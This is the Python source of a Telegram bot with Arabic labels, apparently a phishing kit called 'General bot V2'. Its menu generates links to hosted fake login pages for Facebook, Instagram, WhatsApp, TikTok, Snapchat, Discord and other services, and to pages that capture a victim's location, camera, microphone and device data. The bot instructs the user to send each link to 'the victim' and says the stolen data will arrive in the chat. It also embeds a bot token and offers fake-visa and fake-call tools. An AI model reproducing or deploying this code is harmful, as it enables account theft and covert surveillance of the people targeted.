import os, time, threading, random, string, requests, logging
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html.onrender.com"      # رابط استضافة الصفحات (يجب أن يحتوي على الملفات)
WEBHOOK_URL = "https://gamee-08ue.onrender.com"    # رابط تطبيق البوت
CALL_SITE = "https://callmyphone.org/app"
ADMIN_CHAT_ID = "6829017835"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}
bot_rating = 0

JOKES = [
    "نكتة 1", "نكتة 2", "نكتة 3"   # أضف نكتك هنا
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    # ... (أضف كود الفيزا الوهمية)
    return "💳 فيزا وهمية"

def create_temp_email():
    # ... (أضف كود البريد المؤقت)
    return "📧 بريد وهمي"

def shorten_url(url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200:
            return r.text.strip()
    except:
        pass
    return url

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception:
            return ''
    return '!', 403

# ========== القائمة الرئيسية ==========
def main_menu_markup(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)

    # اختراقات (Callback مع رابط الصفحة + زر رجوع)
    tools = [
        ("📘 فيسبوك", "facebook.html"), ("🎵 تيك توك", "tiktok.html"),
        ("👻 سناب شات", "snapchat.html"), ("📷 انستقرام", "instagram.html"),
        ("💬 واتساب", "whatsapp.html"), ("✈️ تيليجرام", "telegram.html"),
        ("🐦 تويتر", "twitter.html"), ("▶️ يوتيوب", "youtube.html"),
        ("🎮 ديسكورد", "discord.html"), ("🤖 ريدت", "reddit.html"),
        ("📍 الموقع", "gps.html"), ("📸 الكاميرا", "camera.html"),
        ("🎙️ ميكروفون", "mic.html"), ("🎥 فيديو", "video.html"),
        ("📱 الجهاز", "device.html"),
    ]

    for i in range(0, len(tools), 2):
        left = tools[i]
        right = tools[i+1] if i+1 < len(tools) else None
        btn_left = types.InlineKeyboardButton(left[0], callback_data=f"phish|{left[1]}")
        if right:
            btn_right = types.InlineKeyboardButton(right[0], callback_data=f"phish|{right[1]}")
            markup.row(btn_left, btn_right)
        else:
            markup.row(btn_left)

    # بلاغات (روابط حقيقية)
    reports = [
        ("🐦 بلاغ تويتر", "https://help.twitter.com/forms"),
        ("👻 بلاغ سناب", "https://support.snapchat.com/community-report"),
        ("▶️ بلاغ يوتيوب", "https://www.youtube.com/reportingtool"),
        ("✈️ بلاغ تيليجرام", "https://telegram.org/faq_report"),
        ("🎵 بلاغ تيك توك", "https://www.tiktok.com/legal/report/feedback"),
        ("📷 بلاغ انستقرام", "https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, url=link))

    # أدوات البوت
    markup.row(
        types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
        types.InlineKeyboardButton("🔍 معرف الإيدي", callback_data="myid")
    )
    markup.row(
        types.InlineKeyboardButton("💬 فك حظر واتساب", callback_data="unban"),
        types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten")
    )
    markup.row(
        types.InlineKeyboardButton("🌐 ترجمة نص", callback_data="translate"),
        types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr")
    )
    markup.row(
        types.InlineKeyboardButton("🖼️ إنشاء باركود", callback_data="createqr"),
        types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa")
    )
    markup.row(
        types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"),
        types.InlineKeyboardButton("😂 نكتة", callback_data="joke")
    )
    markup.row(
        types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
        types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack")
    )
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))

    return markup

# ========== أوامر البوت ==========
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:",
                     reply_markup=main_menu_markup(chat_id), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    msg_id = call.message.message_id

    if data == "back":
        bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:",
                              chat_id, msg_id, reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return

    if data.startswith("phish|"):
        file = data.split("|")[1]
        link = f"{BASE_URL}/{file}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(
            f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية. البيانات ستصل إليك هنا.",
            chat_id, msg_id, parse_mode="HTML", reply_markup=markup
        )
        bot.answer_callback_query(call.id)
        return

    # ( باقي الحالات مثل call, myid, unban... تبقى كما هي )

# ========== تشغيل ==========
if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))